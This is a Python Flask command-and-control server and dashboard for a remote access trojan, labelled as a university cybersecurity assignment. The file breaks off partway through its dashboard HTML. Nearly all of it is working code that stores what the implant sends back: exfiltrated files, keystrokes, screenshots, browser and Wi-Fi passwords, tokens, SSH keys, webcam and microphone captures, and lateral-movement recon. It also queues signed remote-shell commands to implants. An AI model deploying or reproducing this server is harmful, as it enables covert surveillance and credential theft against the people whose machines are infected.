"""
C2 Listener & Dashboard - Runs on Kali VM
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Receives data from the RAT client and displays a summary dashboard.
Run this on your Kali VM before starting the RAT on Windows.

Usage: python3 server.py
"""

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from datetime import datetime
import base64
import hashlib
import hmac
import json
import os
import threading

# Import crypto for decryption
from crypto_utils import decrypt_payload, derive_key

# ===== OPERATOR AUTHENTICATION (defensive hardening) =====
# The control plane (/commands/*, /kill_switch/activate, /api/summary) is now
# protected by a shared operator token sent in the 'Authorization: Bearer <token>'
# header. Set OPERATOR_TOKEN in the environment; falls back to a demo default.
OPERATOR_TOKEN = os.environ.get("OPERATOR_TOKEN", "operator-demo-token")

# Signing key for commands sent to implants (distinct from the transport key).
# Implants verify the HMAC before executing; a MitM cannot forge commands.
COMMAND_SIGNING_KEY = os.environ.get(
    "COMMAND_SIGNING_KEY", "rmit-edu-demo-command-signing-key"
).encode("utf-8")


def sign_command(command):
    """Return an HMAC-SHA256 hex digest for a command string."""
    return hmac.new(COMMAND_SIGNING_KEY, command.encode("utf-8"), hashlib.sha256).hexdigest()


def require_operator_token():
    """
    Helper that checks the Authorization header for the operator token.
    Returns (tuple_response, None) on failure, or (None, auth) on success.
    Callers use it like:
        err = require_operator_token()[0]
        if err: return err
    """
    auth = request.headers.get("Authorization", "")
    expected = f"Bearer {OPERATOR_TOKEN}"
    if not hmac.compare_digest(auth, expected):
        return jsonify({"status": "unauthorized"}), 401
    return None

app = Flask(__name__)
CORS(app)

# ===== ENCRYPTION CONFIG =====
# Reads from environment variable, falls back to default demo passphrase.
# Must match C2_PASSPHRASE in config.py on the RAT client.
import os as _os
C2_PASSPHRASE = _os.environ.get("C2_PASSPHRASE", "rmit-edu-demo-2026")
ENCRYPT_COMMS = _os.environ.get("ENCRYPT_COMMS", "true").lower() == "true"
AES_KEY = derive_key(C2_PASSPHRASE) if ENCRYPT_COMMS else None

# Storage for received data
received_data = {
    "system_info": None,
    "file_recon": None,
    "screenshots": [],
    "keystrokes": [],
    "exfiltrated_files": [],
    "connection_time": None,
    "last_seen": None,
    # New data types
    "clipboard": [],
    "browser_passwords": [],
    "browser_history": [],
    "privilege_info": None,
    "command_results": [],
    # Phase 9-11 data types
    "wifi_passwords": None,
    "tokens": None,
    "network_recon": None,
    # Phase 12-13 data types
    "lateral_recon": None,
    "event_logs": None,
    # Phase 14-20 data types
    "webcam_images": [],
    "microphone_recordings": [],
    "geolocation": None,
    "usb_recon": None,
    "usb_new_drives": [],
    "injection_recon": None,
    "email_harvest": None,
}

# Kill switch control
kill_switch = False

# Command queue for remote shell (keyed by rat_id)
command_queue = {}

# Create output directory for saved files
OUTPUT_DIR = "loot"
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(f"{OUTPUT_DIR}/screenshots", exist_ok=True)
os.makedirs(f"{OUTPUT_DIR}/files", exist_ok=True)
os.makedirs(f"{OUTPUT_DIR}/browser", exist_ok=True)
os.makedirs(f"{OUTPUT_DIR}/network", exist_ok=True)
os.makedirs(f"{OUTPUT_DIR}/tokens", exist_ok=True)
os.makedirs(f"{OUTPUT_DIR}/lateral", exist_ok=True)
os.makedirs(f"{OUTPUT_DIR}/webcam", exist_ok=True)
os.makedirs(f"{OUTPUT_DIR}/audio", exist_ok=True)
os.makedirs(f"{OUTPUT_DIR}/email", exist_ok=True)
os.makedirs(f"{OUTPUT_DIR}/usb", exist_ok=True)


# ============ HELPER: DECRYPT INCOMING DATA ============

def get_request_data():
    """
    Get request data, decrypting if ENCRYPT_COMMS is enabled.
    Handles both encrypted (octet-stream) and plaintext (JSON) requests.
    """
    content_type = request.content_type or ""

    if ENCRYPT_COMMS and "octet-stream" in content_type:
        # Encrypted payload
        raw = request.get_data(as_text=True)
        return decrypt_payload(raw, AES_KEY)
    else:
        # Plaintext JSON (fallback / backward compatibility)
        return request.json


# ============ EXISTING C2 ENDPOINTS ============

@app.route("/ping")
def ping():
    return jsonify({"status": "online", "server": "edu_c2_rmit"})


@app.route("/kill_switch")
def get_kill_switch():
    return jsonify({"kill": kill_switch})


@app.route("/kill_switch/activate", methods=["POST"])
def activate_kill_switch():
    global kill_switch
    err = require_operator_token()
    if err:
        return err
    kill_switch = True
    print("\n[!] KILL SWITCH ACTIVATED - RAT will stop on next check")
    return jsonify({"status": "kill switch activated"})


@app.route("/data/system_info", methods=["POST"])
def receive_system_info():
    data = get_request_data()
    received_data["system_info"] = data["data"]
    received_data["connection_time"] = datetime.now().isoformat()
    received_data["last_seen"] = datetime.now().isoformat()

    # Save to file
    with open(f"{OUTPUT_DIR}/system_info.json", "w") as f:
        json.dump(data["data"], f, indent=2, default=str)

    print(f"\n[+] SYSTEM INFO received from {data['rat_id']}")
    print(f"    Hostname: {data['data'].get('hostname')}")
    print(f"    OS: {data['data'].get('os')}")
    print(f"    User: {data['data'].get('username')}")
    print(f"    IP: {data['data'].get('local_ip')}")
    return jsonify({"status": "received"})


@app.route("/data/file_recon", methods=["POST"])
def receive_file_recon():
    data = get_request_data()
    received_data["file_recon"] = data["data"]
    received_data["last_seen"] = datetime.now().isoformat()

    with open(f"{OUTPUT_DIR}/file_recon.json", "w") as f:
        json.dump(data["data"], f, indent=2, default=str)

    file_count = len(data["data"].get("interesting_files", []))
    print(f"\n[+] FILE RECON received - {file_count} interesting files found")
    return jsonify({"status": "received"})


@app.route("/data/file_content", methods=["POST"])
def receive_file_content():
    data = get_request_data()
    file_data = data["data"]
    received_data["exfiltrated_files"].append({
        "filename": file_data["filename"],
        "path": file_data["path"],
        "size_bytes": file_data["size_bytes"],
        "timestamp": datetime.now().isoformat()
    })
    received_data["last_seen"] = datetime.now().isoformat()

    # Save the actual file
    try:
        content = base64.b64decode(file_data["content_b64"])
        # Defensive: use only the basename and strip any traversal/unsafe chars.
        safe_name = os.path.basename(file_data["filename"])
        safe_name = "".join(c for c in safe_name if c.isalnum() or c in " ._-()")
        if not safe_name:
            safe_name = "unnamed_file"
        save_path = os.path.join(OUTPUT_DIR, "files", safe_name)
        with open(save_path, "wb") as f:
            f.write(content)
        print(f"\n[+] FILE EXFILTRATED: {file_data['filename']} ({file_data['size_bytes']} bytes)")
    except Exception as e:
        print(f"\n[-] Error saving file: {e}")

    return jsonify({"status": "received"})


@app.route("/data/screenshot", methods=["POST"])
def receive_screenshot():
    data = get_request_data()
    ss_data = data["data"]
    ss_index = len(received_data["screenshots"])

    received_data["screenshots"].append({
        "index": ss_index,
        "timestamp": ss_data["timestamp"],
        "width": ss_data["width"],
        "height": ss_data["height"],
        "size_bytes": ss_data["size_bytes"]
    })
    received_data["last_seen"] = datetime.now().isoformat()

    # Save screenshot
    try:
        img_bytes = base64.b64decode(ss_data["image_b64"])
        save_path = f"{OUTPUT_DIR}/screenshots/screenshot_{ss_index}.png"
        with open(save_path, "wb") as f:
            f.write(img_bytes)
        print(f"\n[+] SCREENSHOT #{ss_index} saved ({ss_data['width']}x{ss_data['height']})")
    except Exception as e:
        print(f"\n[-] Error saving screenshot: {e}")

    return jsonify({"status": "received"})


@app.route("/data/keystrokes", methods=["POST"])
def receive_keystrokes():
    data = get_request_data()
    ks_data = data["data"]

    received_data["keystrokes"].append(ks_data)
    received_data["last_seen"] = datetime.now().isoformat()

    # Append to keylog file
    with open(f"{OUTPUT_DIR}/keystrokes.txt", "a") as f:
        f.write(f"\n--- {ks_data['timestamp']} ({ks_data['keystroke_count']} keys) ---\n")
        f.write(ks_data["text"])
        f.write("\n")

    print(f"\n[+] KEYSTROKES received: {ks_data['keystroke_count']} keys")
    if ks_data["text"]:
        preview = ks_data["text"][:80]
        print(f"    Preview: {preview}...")

    return jsonify({"status": "received"})


# ============ NEW ENDPOINTS ============

@app.route("/data/clipboard", methods=["POST"])
def receive_clipboard():
    data = get_request_data()
    clip_data = data["data"]

    received_data["clipboard"].append(clip_data)
    received_data["last_seen"] = datetime.now().isoformat()

    # Append to clipboard log
    with open(f"{OUTPUT_DIR}/clipboard.txt", "a") as f:
        f.write(f"\n--- {clip_data['timestamp']} ({clip_data['char_count']} chars) ---\n")
        f.write(clip_data["content"])
        f.write("\n")

    preview = clip_data["content"][:80].replace("\n", "\\n")
    print(f"\n[+] CLIPBOARD captured: {clip_data['char_count']} chars - {preview}...")
    return jsonify({"status": "received"})


@app.route("/data/browser_passwords", methods=["POST"])
def receive_browser_passwords():
    data = get_request_data()
    pw_data = data["data"]

    received_data["browser_passwords"].append(pw_data)
    received_data["last_seen"] = datetime.now().isoformat()

    # Save to file
    with open(f"{OUTPUT_DIR}/browser/passwords.json", "w") as f:
        json.dump(received_data["browser_passwords"], f, indent=2, default=str)

    browser = pw_data.get("browser", "unknown")
    count = len(pw_data.get("credentials", []))
    print(f"\n[+] BROWSER PASSWORDS ({browser}): {count} credentials received")
    return jsonify({"status": "received"})


@app.route("/data/browser_history", methods=["POST"])
def receive_browser_history():
    data = get_request_data()
    hist_data = data["data"]

    received_data["browser_history"].append(hist_data)
    received_data["last_seen"] = datetime.now().isoformat()

    # Save to file
    with open(f"{OUTPUT_DIR}/browser/history.json", "w") as f:
        json.dump(received_data["browser_history"], f, indent=2, default=str)

    browser = hist_data.get("browser", "unknown")
    count = len(hist_data.get("history", []))
    print(f"\n[+] BROWSER HISTORY ({browser}): {count} entries received")
    return jsonify({"status": "received"})


@app.route("/data/privilege_info", methods=["POST"])
def receive_privilege_info():
    data = get_request_data()
    priv_data = data["data"]

    received_data["privilege_info"] = priv_data
    received_data["last_seen"] = datetime.now().isoformat()

    # Save to file
    with open(f"{OUTPUT_DIR}/privilege_info.json", "w") as f:
        json.dump(priv_data, f, indent=2, default=str)

    admin_str = "ADMIN" if priv_data.get("is_admin") else "standard user"
    opp_count = len(priv_data.get("escalation_opportunities", []))
    print(f"\n[+] PRIVILEGE INFO: running as {admin_str}, {opp_count} escalation paths")
    return jsonify({"status": "received"})


@app.route("/data/cmd_result", methods=["POST"])
def receive_cmd_result():
    data = get_request_data()
    cmd_data = data["data"]

    received_data["command_results"].append({
        **cmd_data,
        "timestamp": datetime.now().isoformat()
    })
    received_data["last_seen"] = datetime.now().isoformat()

    # Append to results file
    with open(f"{OUTPUT_DIR}/cmd_results.txt", "a") as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"Command: {cmd_data['command']}\n")
        f.write(f"Return Code: {cmd_data['return_code']}\n")
        f.write(f"STDOUT:\n{cmd_data['stdout']}\n")
        if cmd_data['stderr']:
            f.write(f"STDERR:\n{cmd_data['stderr']}\n")

    print(f"\n[+] CMD RESULT: '{cmd_data['command'][:50]}' (rc={cmd_data['return_code']})")
    return jsonify({"status": "received"})


@app.route("/data/wifi_passwords", methods=["POST"])
def receive_wifi_passwords():
    data = get_request_data()
    wifi_data = data["data"]

    received_data["wifi_passwords"] = wifi_data
    received_data["last_seen"] = datetime.now().isoformat()

    # Save to file
    with open(f"{OUTPUT_DIR}/wifi_passwords.json", "w") as f:
        json.dump(wifi_data, f, indent=2, default=str)

    passwords = wifi_data.get("passwords", [])
    pw_count = sum(1 for w in passwords if w.get("password"))
    print(f"\n[+] WI-FI PASSWORDS: {pw_count} passwords from {len(passwords)} profiles")
    for w in passwords:
        if w.get("password"):
            print(f"    SSID: {w['ssid']} → {w['password']}")
    return jsonify({"status": "received"})


@app.route("/data/tokens", methods=["POST"])
def receive_tokens():
    data = get_request_data()
    token_data = data["data"]

    received_data["tokens"] = token_data
    received_data["last_seen"] = datetime.now().isoformat()

    # Save to file
    with open(f"{OUTPUT_DIR}/tokens/all_tokens.json", "w") as f:
        json.dump(token_data, f, indent=2, default=str)

    s = token_data.get("summary", {})
    print(f"\n[+] TOKEN HARVEST:")
    print(f"    Discord tokens: {s.get('discord_tokens_found', 0)}")
    print(f"    SSH keys: {s.get('ssh_keys_found', 0)}")
    print(f"    Cloud credential files: {s.get('cloud_cred_files', 0)}")
    print(f"    .env files: {s.get('env_files_found', 0)}")
    return jsonify({"status": "received"})


@app.route("/data/network_recon", methods=["POST"])
def receive_network_recon():
    data = get_request_data()
    net_data = data["data"]

    received_data["network_recon"] = net_data
    received_data["last_seen"] = datetime.now().isoformat()

    # Save to file
    with open(f"{OUTPUT_DIR}/network/recon.json", "w") as f:
        json.dump(net_data, f, indent=2, default=str)

    s = net_data.get("summary", {})
    print(f"\n[+] NETWORK RECON:")
    print(f"    Devices on network (ARP): {s.get('devices_on_network', 0)}")
    print(f"    Active connections: {s.get('active_connections', 0)}")
    print(f"    DNS cache entries: {s.get('dns_entries', 0)}")
    print(f"    Listening ports: {s.get('listening_ports', 0)}")
    print(f"    Network shares: {s.get('shares', 0)}")
    return jsonify({"status": "received"})


@app.route("/data/lateral_recon", methods=["POST"])
def receive_lateral_recon():
    data = get_request_data()
    lat_data = data["data"]

    received_data["lateral_recon"] = lat_data
    received_data["last_seen"] = datetime.now().isoformat()

    # Save to file
    with open(f"{OUTPUT_DIR}/lateral/recon.json", "w") as f:
        json.dump(lat_data, f, indent=2, default=str)

    s = lat_data.get("summary", {})
    print(f"\n[+] LATERAL RECON:")
    print(f"    Hosts scanned: {s.get('hosts_scanned', 0)}")
    print(f"    Hosts with open ports: {s.get('hosts_with_open_ports', 0)}")
    print(f"    SMB hosts: {s.get('smb_hosts', 0)}")
    print(f"    Admin share access: {s.get('admin_access_hosts', 0)}")
    if s.get("in_domain"):
        print(f"    Domain: {s.get('domain_name', 'N/A')}")
        print(f"    Domain users: {s.get('domain_users_found', 0)}")
    return jsonify({"status": "received"})


@app.route("/data/event_logs", methods=["POST"])
def receive_event_logs():
    data = get_request_data()
    log_data = data["data"]

    received_data["event_logs"] = log_data
    received_data["last_seen"] = datetime.now().isoformat()

    # Save to file
    with open(f"{OUTPUT_DIR}/event_logs.json", "w") as f:
        json.dump(log_data, f, indent=2, default=str)

    s = log_data.get("summary", {})
    print(f"\n[+] EVENT LOG RECON:")
    print(f"    Logs enumerated: {s.get('logs_enumerated', 0)}")
    print(f"    Total records: {s.get('total_records', 0)}")
    print(f"    Total size: {s.get('total_size_mb', 0)} MB")
    if s.get("logs_cleared", 0) > 0:
        print(f"    [!] Logs cleared: {s['logs_cleared']}")
    return jsonify({"status": "received"})


@app.route("/data/webcam", methods=["POST"])
def receive_webcam():
    data = get_request_data()
    wc_data = data["data"]
    wc_index = len(received_data["webcam_images"])

    received_data["webcam_images"].append({
        "index": wc_index,
        "timestamp": wc_data["timestamp"],
        "width": wc_data["width"],
        "height": wc_data["height"],
        "size_bytes": wc_data["size_bytes"],
    })
    received_data["last_seen"] = datetime.now().isoformat()

    # Save webcam image
    try:
        img_bytes = base64.b64decode(wc_data["image_b64"])
        save_path = f"{OUTPUT_DIR}/webcam/webcam_{wc_index}.jpg"
        with open(save_path, "wb") as f:
            f.write(img_bytes)
        print(f"\n[+] WEBCAM #{wc_index} saved ({wc_data['width']}x{wc_data['height']})")
    except Exception as e:
        print(f"\n[-] Error saving webcam image: {e}")

    return jsonify({"status": "received"})


@app.route("/data/microphone", methods=["POST"])
def receive_microphone():
    data = get_request_data()
    mic_data = data["data"]
    mic_index = len(received_data["microphone_recordings"])

    received_data["microphone_recordings"].append({
        "index": mic_index,
        "timestamp": mic_data["timestamp"],
        "duration_seconds": mic_data["duration_seconds"],
        "size_bytes": mic_data["size_bytes"],
        "peak_amplitude": mic_data.get("peak_amplitude", 0),
    })
    received_data["last_seen"] = datetime.now().isoformat()

    # Save audio file
    try:
        audio_bytes = base64.b64decode(mic_data["audio_b64"])
        save_path = f"{OUTPUT_DIR}/audio/recording_{mic_index}.wav"
        with open(save_path, "wb") as f:
            f.write(audio_bytes)
        print(f"\n[+] AUDIO #{mic_index} saved ({mic_data['duration_seconds']}s, {mic_data['size_bytes']} bytes)")
    except Exception as e:
        print(f"\n[-] Error saving audio: {e}")

    return jsonify({"status": "received"})


@app.route("/data/geolocation", methods=["POST"])
def receive_geolocation():
    data = get_request_data()
    geo_data = data["data"]

    received_data["geolocation"] = geo_data
    received_data["last_seen"] = datetime.now().isoformat()

    with open(f"{OUTPUT_DIR}/geolocation.json", "w") as f:
        json.dump(geo_data, f, indent=2, default=str)

    s = geo_data.get("summary", {})
    print(f"\n[+] GEOLOCATION:")
    print(f"    Public IP: {s.get('public_ip', 'N/A')}")
    print(f"    Location: {s.get('city', '?')}, {s.get('country', '?')}")
    print(f"    ISP: {s.get('isp', 'N/A')}")
    return jsonify({"status": "received"})


@app.route("/data/usb_recon", methods=["POST"])
def receive_usb_recon():
    data = get_request_data()
    usb_data = data["data"]

    received_data["usb_recon"] = usb_data
    received_data["last_seen"] = datetime.now().isoformat()

    with open(f"{OUTPUT_DIR}/usb/recon.json", "w") as f:
        json.dump(usb_data, f, indent=2, default=str)

    s = usb_data.get("summary", {})
    print(f"\n[+] USB RECON: {s.get('drives_found', 0)} removable drives, "
          f"{s.get('total_interesting_files', 0)} interesting files")
    return jsonify({"status": "received"})


@app.route("/data/usb_new_drive", methods=["POST"])
def receive_usb_new_drive():
    data = get_request_data()
    drive_data = data["data"]

    received_data["usb_new_drives"].append({
        **drive_data,
        "detected_at": datetime.now().isoformat(),
    })
    received_data["last_seen"] = datetime.now().isoformat()

    print(f"\n[+] NEW USB DRIVE DETECTED: {drive_data.get('drive_letter', '?')}: "
          f"({drive_data.get('volume_name', 'Unknown')})")
    return jsonify({"status": "received"})


@app.route("/data/injection_recon", methods=["POST"])
def receive_injection_recon():
    data = get_request_data()
    inj_data = data["data"]

    received_data["injection_recon"] = inj_data
    received_data["last_seen"] = datetime.now().isoformat()

    with open(f"{OUTPUT_DIR}/injection_recon.json", "w") as f:
        json.dump(inj_data, f, indent=2, default=str)

    s = inj_data.get("summary", {})
    print(f"\n[+] INJECTION RECON: {s.get('total_targets_found', 0)} targets, "
          f"{s.get('viable_targets', 0)} viable, {s.get('techniques_available', 0)} techniques")
    return jsonify({"status": "received"})


@app.route("/data/email_harvest", methods=["POST"])
def receive_email_harvest():
    data = get_request_data()
    email_data = data["data"]

    received_data["email_harvest"] = email_data
    received_data["last_seen"] = datetime.now().isoformat()

    with open(f"{OUTPUT_DIR}/email/harvest.json", "w") as f:
        json.dump(email_data, f, indent=2, default=str)

    s = email_data.get("summary", {})
    print(f"\n[+] EMAIL HARVEST:")
    print(f"    Outlook profiles: {s.get('outlook_count', 0)}")
    print(f"    Thunderbird profiles: {s.get('thunderbird_count', 0)}")
    print(f"    Unique emails found: {s.get('unique_emails_found', 0)}")
    return jsonify({"status": "received"})


@app.route("/commands/<rat_id>", methods=["GET"])
def get_commands(rat_id):
    """Return queued commands for a RAT and clear the queue.

    Polled by implants. Commands are HMAC-signed (see send_command), so an
    implant rejects any command whose signature does not verify. This endpoint
    only *reads* the queue for a given rat_id; the mutating operator endpoint
    (/commands/send) and other control endpoints require an operator token.
    """
    commands = command_queue.pop(rat_id, [])
    # Return each queued entry as {command, signature} so implants can verify.
    return jsonify({"commands": commands})


@app.route("/commands/send", methods=["POST"])
def send_command():
    """Queue a command to be sent to a RAT. Operator-authenticated."""
    err = require_operator_token()
    if err:
        return err

    data = request.json
    rat_id = data.get("rat_id", "edu_rat_rmit")
    cmd = data.get("command", "")

    if cmd:
        if rat_id not in command_queue:
            command_queue[rat_id] = []
        sig = sign_command(cmd)
        command_queue[rat_id].append({"command": cmd, "signature": sig})
        print(f"\n[>] Command queued for {rat_id}: {cmd[:80]} (sig={sig[:12]}...)")
        return jsonify({"status": "queued", "command": cmd, "signature": sig})

    return jsonify({"status": "error", "message": "No command provided"}), 400


# ============ DASHBOARD ============

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard - EDUCATIONAL</title>
    <meta http-equiv="refresh" content="10">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { color: #ff0040; text-align: center; margin-bottom: 5px; font-size: 24px; }
        .subtitle { color: #666; text-align: center; margin-bottom: 20px; font-size: 12px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
        .card { background: #111; border: 1px solid #333; border-radius: 8px; padding: 15px; }
        .card h2 { color: #00ff41; font-size: 14px; border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 10px; }
        .card.full { grid-column: 1 / -1; }
        .stat { display: flex; justify-content: space-between; padding: 4px 0; font-size: 13px; }
        .stat .label { color: #888; }
        .stat .value { color: #00ff41; }
        .alert { color: #ff0040; }
        .file-list { max-height: 200px; overflow-y: auto; }
        .file-item { padding: 3px 0; font-size: 12px; border-bottom: 1px solid #1a1a1a; }
        .keystroke-box { background: #0a0a0a; border: 1px solid #333; padding: 10px; font-size: 12px;
                         max-height: 150px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
        .status-bar { text-align: center; padding: 10px; font-size: 12px; color: #666; }
        .online { color: #00ff41; }
        .screenshot-info { font-size: 12px; color: #888; }
        .kill-btn { background: #ff0040; color: white; border: none; padding: 10px 20px;
                    cursor: pointer; font-family: 'Courier New'; font-size: 14px; border-radius: 4px;
                    display: block; margin: 10px auto; }
        .kill-btn:hover { background: #cc0033; }
        .encrypt-badge { display: inline-block; padding: 2px 8px; border-radius: 4px;
                         font-size: 11px; margin-left: 10px; }
        .encrypt-on { background: #004400; color: #00ff41; }
        .encrypt-off { background: #440000; color: #ff4444; }
        table { width: 100%; border-collapse: collapse; font-size: 12px; }
        table th { text-align: left; color: #888; border-bottom: 1px solid #333; padding: 4px; }
        table td { padding: 4px; border-bottom: 1px solid #1a1a1a; }
        .cmd-input { width: calc(100% - 80px); background: #0a0a0a; border: 1px solid #333;
                     color: #00ff41; padding: 8px; font-family: 'Courier New'; font-size: 13px; }
        .cmd-btn { width: 70px; background: #003300; color: #00ff41; border: 1px solid #00ff41;
                   padding: 8px; cursor: pointer; font-family: 'Courier New'; font-size: 13px; }
        .cmd-btn:hover { background: #004400; }
        .cmd-output { background: #0a0a0a; border: 1px solid #333; padding: 10px; font-size: 12px;
                      max-height: 200px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
        .clip-item { padding: 4px 0; font-size: 12px; border-bottom: 1px solid #1a1a1a; }
        .badge { display: inline-block; padding: 1px 6px; border-radius: 3px; font-size: 10px; }
        .badge-admin { background: #ff0040; color: white; }
        .badge-user { background: #333; color: #888; }
    </style>
</head>
<body>
    <h1>// C2 COMMAND & CONTROL DASHBOARD //
        {% if encrypt_on %}
        <span class="encrypt-badge encrypt-on">&#x1f512; AES-256</span>
        {% else %}
        <span class="encrypt-badge encrypt-off">&#x1f513; PLAINTEXT</span>
        {% endif %}
    </h1>
    <p class="subtitle">RMIT CYBERSECURITY - EDUCATIONAL PURPOSE ONLY</p>

    {% if not data.system_info %}
    <div class="card full">
        <h2>WAITING FOR CONNECTION</h2>
        <p style="text-align:center; padding: 20px;">No RAT client connected yet. Run rat_client.py on the target machine.</p>
    </div>
    {% else %}

    <div class="grid">
        <div class="card">
            <h2>TARGET SYSTEM INFO</h2>
            <div class="stat"><span class="label">Hostname:</span><span class="value">{{ data.system_info.hostname }}</span></div>
            <div class="stat"><span class="label">OS:</span><span class="value">{{ data.system_info.os }}</span></div>
            <div class="stat"><span class="label">Username:</span><span class="value alert">{{ data.system_info.username }}</span></div>
            <div class="stat"><span class="label">Local IP:</span><span class="value">{{ data.system_info.local_ip }}</span></div>
            <div class="stat"><span class="label">MAC:</span><span class="value">{{ data.system_info.mac_address }}</span></div>
            <div class="stat"><span class="label">CPU:</span><span class="value">{{ data.system_info.cpu_count }} cores ({{ data.system_info.cpu_percent }}%)</span></div>
            <div class="stat"><span class="label">RAM:</span><span class="value">{{ data.system_info.ram_total_gb }} GB ({{ data.system_info.ram_used_percent }}%)</span></div>
        </div>

        <div class="card">
            <h2>COLLECTION STATS</h2>
            <div class="stat"><span class="label">Connected:</span><span class="value online">{{ data.connection_time }}</span></div>
            <div class="stat"><span class="label">Last Seen:</span><span class="value">{{ data.last_seen }}</span></div>
            <div class="stat"><span class="label">Screenshots:</span><span class="value">{{ data.screenshots|length }}</span></div>
            <div class="stat"><span class="label">Keystroke Batches:</span><span class="value">{{ data.keystrokes|length }}</span></div>
            <div class="stat"><span class="label">Files Exfiltrated:</span><span class="value alert">{{ data.exfiltrated_files|length }}</span></div>
            <div class="stat"><span class="label">Clipboard Captures:</span><span class="value">{{ data.clipboard|length }}</span></div>
            <div class="stat"><span class="label">Webcam Images:</span><span class="value">{{ data.webcam_images|length }}</span></div>
            <div class="stat"><span class="label">Audio Recordings:</span><span class="value">{{ data.microphone_recordings|length }}</span></div>
            <div class="stat"><span class="label">Command Results:</span><span class="value">{{ data.command_results|length }}</span></div>
            {% if data.file_recon %}
            <div class="stat"><span class="label">Interesting Files Found:</span><span class="value">{{ data.file_recon.interesting_files|length }}</span></div>
            {% endif %}
        </div>
    </div>

    <div class="grid">
        <div class="card">
            <h2>EXFILTRATED FILES</h2>
            <div class="file-list">
            {% for f in data.exfiltrated_files %}
                <div class="file-item">{{ f.filename }} ({{ f.size_bytes }} bytes)</div>
            {% endfor %}
            {% if not data.exfiltrated_files %}
                <div class="file-item" style="color:#666">No files exfiltrated yet</div>
            {% endif %}
            </div>
        </div>

        <div class="card">
            <h2>CAPTURED KEYSTROKES</h2>
            <div class="keystroke-box">{% for ks in data.keystrokes %}{{ ks.text }}{% endfor %}{% if not data.keystrokes %}Waiting for keystrokes...{% endif %}</div>
        </div>
    </div>

    <!-- NEW: Privilege Info + Browser Creds -->
    <div class="grid">
        <div class="card">
            <h2>PRIVILEGE STATUS</h2>
            {% if data.privilege_info %}
            <div class="stat">
                <span class="label">Admin:</span>
                <span class="value">
                    {% if data.privilege_info.is_admin %}
                    <span class="badge badge-admin">ADMIN</span>
                    {% else %}
                    <span class="badge badge-user">Standard User</span>
                    {% endif %}
                </span>
            </div>
            {% if data.privilege_info.privilege_info %}
            <div class="stat"><span class="label">Integrity:</span><span class="value">{{ data.privilege_info.privilege_info.integrity_level }}</span></div>
            {% endif %}
            {% if data.privilege_info.uac_settings %}
            <div class="stat"><span class="label">UAC Level:</span><span class="value">{{ data.privilege_info.uac_settings.uac_level }}</span></div>
            <div class="stat"><span class="label">UAC Risk:</span><span class="value">{{ data.privilege_info.uac_settings.risk_assessment }}</span></div>
            {% endif %}
            {% if data.privilege_info.escalation_opportunities %}
            <div class="stat"><span class="label">Escalation Paths:</span><span class="value alert">{{ data.privilege_info.escalation_opportunities|length }}</span></div>
            {% for opp in data.privilege_info.escalation_opportunities[:5] %}
            <div class="file-item">[{{ opp.risk }}] {{ opp.type }}: {{ opp.detail[:80] }}</div>
            {% endfor %}
            {% endif %}
            {% else %}
            <div style="color:#666">Waiting for privilege recon...</div>
            {% endif %}
        </div>

        <div class="card">
            <h2>BROWSER CREDENTIALS</h2>
            {% if data.browser_passwords %}
            <table>
                <tr><th>URL</th><th>Username</th><th>Password</th></tr>
                {% for entry in data.browser_passwords %}
                {% for cred in entry.credentials[:10] %}
                <tr>
                    <td>{{ cred.url[:40] }}</td>
                    <td class="alert">{{ cred.username }}</td>
                    <td>{{ cred.password[:3] }}***</td>
                </tr>
                {% endfor %}
                {% endfor %}
            </table>
            {% else %}
            <div style="color:#666">No browser credentials captured yet</div>
            {% endif %}
        </div>
    </div>

    <!-- NEW: Clipboard + Remote Shell -->
    <div class="grid">
        <div class="card">
            <h2>CLIPBOARD CAPTURES (Latest 10)</h2>
            {% if data.clipboard %}
            {% for clip in data.clipboard[-10:]|reverse %}
            <div class="clip-item">
                <span style="color:#888">{{ clip.timestamp[-8:] }}</span>
                {{ clip.content[:100]|e }}{% if clip.content|length > 100 %}...{% endif %}
            </div>
            {% endfor %}
            {% else %}
            <div style="color:#666">No clipboard data captured yet</div>
            {% endif %}
        </div>

        <div class="card">
            <h2>REMOTE SHELL</h2>
            <div style="margin-bottom: 10px;">
                <input type="text" id="cmdInput" class="cmd-input" placeholder="Enter command..."
                       onkeypress="if(event.key==='Enter')sendCmd()">
                <button class="cmd-btn" onclick="sendCmd()">SEND</button>
            </div>
            <div class="cmd-output" id="cmdOutput">
                {% if data.command_results %}
                {% for r in data.command_results[-5:]|reverse %}
<span style="color:#888">$</span> {{ r.command }}
{{ r.stdout }}{% if r.stderr %}<span style="color:#ff0040">{{ r.stderr }}</span>{% endif %}
{% endfor %}
                {% else %}
Waiting for commands...
                {% endif %}
            </div>
            <script>
            function sendCmd() {
                var cmd = document.getElementById('cmdInput').value;
                if (!cmd) return;
                fetch('/commands/send', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer {{ operator_token }}'
                    },
                    body: JSON.stringify({rat_id: 'edu_rat_rmit', command: cmd})
                }).then(function() {
                    document.getElementById('cmdInput').value = '';
                });
            }
            </script>
        </div>
    </div>

    <!-- NEW: Wi-Fi Passwords + Token Harvest -->
    <div class="grid">
        <div class="card">
            <h2>WI-FI PASSWORDS (T1552.001)</h2>
            {% if data.wifi_passwords and data.wifi_passwords.passwords %}
            <table>
                <tr><th>SSID</th><th>Password</th><th>Auth</th></tr>
                {% for w in data.wifi_passwords.passwords %}
                <tr>
                    <td>{{ w.ssid }}</td>
                    <td class="alert">{{ w.password or '(open)' }}</td>
                    <td>{{ w.auth or 'N/A' }}</td>
                </tr>
                {% endfor %}
            </table>
            {% if data.wifi_passwords.interface %}
            <div class="stat" style="margin-top:8px">
                <span class="label">Current BSSID:</span>
                <span class="value">{{ data.wifi_passwords.interface.get('bssid', 'N/A') }}</span>
            </div>
            {% endif %}
            {% else %}
            <div style="color:#666">Waiting for Wi-Fi data...</div>
            {% endif %}
        </div>

        <div class="card">
